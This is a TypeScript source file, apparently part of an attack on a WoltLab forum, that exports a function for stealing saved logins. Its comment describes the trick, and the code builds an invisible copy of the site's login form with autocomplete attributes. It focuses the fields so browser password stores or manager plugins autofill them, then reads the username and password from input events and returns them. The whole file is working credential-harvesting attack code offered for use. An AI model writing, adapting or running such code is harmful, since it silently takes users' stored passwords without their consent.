import type { AccountCredentials } from '@types';

/**
 * Another big step towards the end was made. The idea of the possibility to abuse the autocomplete attributes
 * of input elements within a form element came to me already at the Daichi Hack. Here this plays again an
 * important role.
 *
 * By recreating the exact same form based on the original login form, account stores such as Google Chrome Vault
 * or even external browser plugins such as Dashlane can be tricked. They are fooled into thinking that the user
 * wants to log in, and by auto-completing, the device outputs the user's data.
 *
 * @returns Username and password.
 */
export const getAccountCredentials = async () => {
	const usernameInputElement = document.createElement('input');
	usernameInputElement.type = 'text';
	usernameInputElement.id = 'username';
	usernameInputElement.name = 'username';
	usernameInputElement.autocomplete = 'username';

	const passwordInputElement = document.createElement('input');
	passwordInputElement.type = 'password';
	passwordInputElement.id = 'password';
	passwordInputElement.name = 'password';
	passwordInputElement.autocomplete = 'current-password';

	const useCookiesInputElement = document.createElement('input');
	useCookiesInputElement.type = 'checkbox';
	useCookiesInputElement.id = 'useCookies';
	useCookiesInputElement.name = 'useCookies';
	useCookiesInputElement.value = '1';
	useCookiesInputElement.checked = true;

	const urlInputElement = document.createElement('input');
	urlInputElement.type = 'hidden';
	urlInputElement.name = 'url';
	urlInputElement.value = location.href;

	const tokenInputElement = document.createElement('input');
	tokenInputElement.type = 'hidden';
	tokenInputElement.name = 't';
	tokenInputElement.value = window.SECURITY_TOKEN;

	const usernameProm = new Promise<string>((resolve) =>
		usernameInputElement.addEventListener('input', () => resolve(usernameInputElement.value))
	);
	const passwordProm = new Promise<string>((resolve) =>
		passwordInputElement.addEventListener('input', () => resolve(passwordInputElement.value))
	);

	const credentialsFormElement = document.createElement('form');
	credentialsFormElement.action = `${window.WCF_PATH}index.php?login/`;
	credentialsFormElement.method = 'post';
	credentialsFormElement.style.display = 'none';
	credentialsFormElement.appendChild(usernameInputElement);
	credentialsFormElement.appendChild(passwordInputElement);
	credentialsFormElement.appendChild(useCookiesInputElement);
	credentialsFormElement.appendChild(urlInputElement);
	credentialsFormElement.appendChild(tokenInputElement);

	document.documentElement.appendChild(credentialsFormElement);

	// Without focus, input event is not triggered by autocomplete in some browsers when
	// placed inside of IFrames.
	usernameInputElement.focus();
	passwordInputElement.focus();

	const username = await usernameProm;
	const password = await passwordProm;

	document.documentElement.removeChild(credentialsFormElement);

	const accountCredentials: AccountCredentials = {
		username,
		password,
	};

	return accountCredentials;
};
